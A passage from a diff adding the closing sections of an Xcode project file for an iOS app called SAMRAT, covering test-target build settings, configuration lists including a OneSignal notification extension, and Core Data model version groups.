+				PRODUCT_BUNDLE_IDENTIFIER = si.SAMRATTests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/SAMRAT.app/SAMRAT";
+			};
+			name = Release;
+		};
+		9164F10E25E766E20024E8FE /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 51D47556FB55840DA259AB62 /* Pods-SAMRAT-SAMRATUITests.debug.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = KC28TW5938;
+				EXCLUDED_ARCHS = arm64;
+				INFOPLIST_FILE = SAMRATUITests/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = si.SAMRATUITests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_TARGET_NAME = SAMRAT;
+			};
+			name = Debug;
+		};
+		9164F10F25E766E20024E8FE /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 2191F26DCBE67705A21B5302 /* Pods-SAMRAT-SAMRATUITests.release.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = KC28TW5938;
+				EXCLUDED_ARCHS = arm64;
+				INFOPLIST_FILE = SAMRATUITests/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = si.SAMRATUITests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_TARGET_NAME = SAMRAT;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		1875964D264442130015BEBC /* Build configuration list for PBXNativeTarget "OneSignalNotificationServiceExtension" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				1875964E264442130015BEBC /* Debug */,
+				1875964F264442130015BEBC /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		9164F0D525E766E10024E8FE /* Build configuration list for PBXProject "SAMRAT" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				9164F10525E766E20024E8FE /* Debug */,
+				9164F10625E766E20024E8FE /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		9164F10725E766E20024E8FE /* Build configuration list for PBXNativeTarget "SAMRAT" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				9164F10825E766E20024E8FE /* Debug */,
+				9164F10925E766E20024E8FE /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		9164F10A25E766E20024E8FE /* Build configuration list for PBXNativeTarget "SAMRATTests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				9164F10B25E766E20024E8FE /* Debug */,
+				9164F10C25E766E20024E8FE /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		9164F10D25E766E20024E8FE /* Build configuration list for PBXNativeTarget "SAMRATUITests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				9164F10E25E766E20024E8FE /* Debug */,
+				9164F10F25E766E20024E8FE /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+
+/* Begin XCVersionGroup section */
+		9164F0E625E766E10024E8FE /* SAMRAT.xcdatamodeld */ = {
+			isa = XCVersionGroup;
+			children = (
+				9164F0E725E766E10024E8FE /* SAMRAT.xcdatamodel */,
+			);
+			currentVersion = 9164F0E725E766E10024E8FE /* SAMRAT.xcdatamodel */;
+			path = SAMRAT.xcdatamodeld;
+			sourceTree = "<group>";
+			versionGroupType = wrapper.xcdatamodel;
+		};
+		F7A06AB1270AE14B00063A8C /* Model.xcdatamodeld */ = {
+			isa = XCVersionGroup;
+			children = (
+				F7A06AB2270AE14B00063A8C /* Model.xcdatamodel */,
+			);
+			currentVersion = F7A06AB2270AE14B00063A8C /* Model.xcdatamodel */;
+			path = Model.xcdatamodeld;
+			sourceTree = "<group>";
+			versionGroupType = wrapper.xcdatamodel;
+		};
+/* End XCVersionGroup section */
+	};
+	rootObject = 9164F0D225E766E10024E8FE /* Project object */;
+}
